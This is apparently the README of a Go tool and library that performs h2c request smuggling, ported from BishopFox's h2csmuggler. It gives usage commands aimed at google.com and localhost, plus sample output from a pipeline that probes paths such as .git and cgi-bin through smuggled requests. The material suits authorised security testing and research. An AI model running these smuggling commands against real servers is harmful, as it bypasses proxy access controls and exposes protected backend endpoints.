
# h2cSmuggler

## Tl;dr

this repo implements h2csmuggler from https://github.com/BishopFox/h2csmuggler in golang.

this repo also implements a golang library for performing h2c smuggling. This was done via forking the net/http2 library and modifying the client to accept and process non-spec compliant h2c upgrades over tls connections. This can also handle h2c upgrades over http.

Two utilities have been added to assist testing:

```
# check will return whether a h2c connection can be formed and the first request will return
go run ./cmd/h2csmuggler check https://google.com/ http://localhost

# smuggle will attempt the cli arguments as URLs sequentially
go run ./cmd/h2csmuggler smuggle https://google.com/ https://google.com/flag

# demo will create a http server that accepts non-complaint `Connection: Upgrade` connections and upgrade them to h2c for testing
go run ./cmd/demo

$ cat ~/tools/lists/rafter.txt | head -n 10 | ./h2cs mutate pitchfork http://localhost - -p api | ./h2cs smuggle http://localhost - -ojson
{"body":38,"level":"info","msg":"success","status":200,"target":"http://localhost/javsacript/main.js","time":"2020-09-16T12:43:05+10:00"}
{"body":39,"level":"info","msg":"success","status":200,"target":"http://localhost/javascripts/main.js","time":"2020-09-16T12:43:05+10:00"}
{"body":24,"level":"info","msg":"success","status":200,"target":"http://localhost/.git","time":"2020-09-16T12:43:05+10:00"}
{"body":28,"level":"info","msg":"success","status":200,"target":"http://localhost/api/_rpc","time":"2020-09-16T12:43:05+10:00"}
{"body":34,"level":"info","msg":"success","status":200,"target":"http://localhost/api/csrf-token","time":"2020-09-16T12:43:05+10:00"}
{"body":27,"level":"info","msg":"success","status":200,"target":"http://localhost/cgi-bin","time":"2020-09-16T12:43:05+10:00"}
<snip>
```


### Author

Twitter: [@seanyeoh](https://twitter.com/seanyeoh)

GitHub: [minight](https://github.com/minight/)

### Original Research

Jake Miller - https://github.com/BishopFox/h2csmuggler
